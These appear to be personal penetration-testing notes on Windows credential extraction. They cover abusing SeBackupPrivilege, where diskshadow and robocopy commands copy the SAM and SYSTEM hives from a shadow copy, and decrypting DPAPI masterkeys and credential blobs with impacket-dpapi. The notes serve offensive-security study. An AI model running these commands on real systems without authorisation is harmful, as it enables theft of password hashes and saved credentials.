
## 1. SeBackUp privilege:

SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with SeBackupPrivilege enabled eliminates the need for any ACL-based security check.

The takeaway is that with SeBackupPrivilege enabled, the attacker can backup the entire drive, which includes files that the user with the permission does not have permissions on. From there, the attacker can access any of the files from the backup volume they create.

we will extract a copy of the SAM file  by creating a shadow copy of C: using diskshadow.exe. After creating a shadow copy of C:, we can interact with it and access any file from the file system. Since this is a copy of C:, we can directly access the SAM and SYSTEM files.

```powershell
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii

echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append

echo "create" | out-file ./diskshadow.txt -encoding ascii -append

echo "expose temp z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\temp\diskshadow.txt
```

Now that the shadow copy has been successfully created and exposed as Z:, we can use the following **robocopy** commands to extract a copy of the SYSTEM and SAM files from Z:\windows\system32\config:


```powershell
robocopy /b Z:\Windows\System32\Config C:\temp SAM

robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
```




## 2. DPAPI: 

DPAPI is a windows' built-in encryption system for protecting sensitive data — like saved passwords, certificates and secrets — tied to a user or machine


It can protect : 
- Saved Creds (RDP, SMB, VPN)
- Browser Passwords
- Wifi keys
- Outlook, Windows Vault, Credential Manager entries
- chrome cookies 


#### Working Mechanism

1. Data is encrypted with **CryptProtectData()**
2. This uses a Master Key, which is stored encrypted in :
	- `C:\Users\username\appdata\Roaming\Microsoft\Protect\SID\`


3. This MasterKey is encrypted with :
	- The user's password (or)
	- The machine's system key




#### Credential extraction from encrypted Credential blobs


If we have access to a user's password, we can attempt to decrypt their DPAPI masterkey. We can utilise this decrypted masterkey to extract credentials from the encrypted Credential blob stored in : 

```Powershell
C:\Users\username\appdata\Roaming\Microsoft\Credentials\
```



#### Impacket-dpapi


Once we have locally saved the encrypted masterkey and the encrypted credential blob, we can use `impacket-dpapi` to decrypt the credential blob.



1. Decrypting the masterkey

```bash
impacket-dpapi -master <masterkeyfile> -sid SID -password <password_of_the_user>
```



2. Decrypting the credential blob

```bash
impacket-dpapi -key <decrypted_master_key> -cred <encrypted_cred_blob>
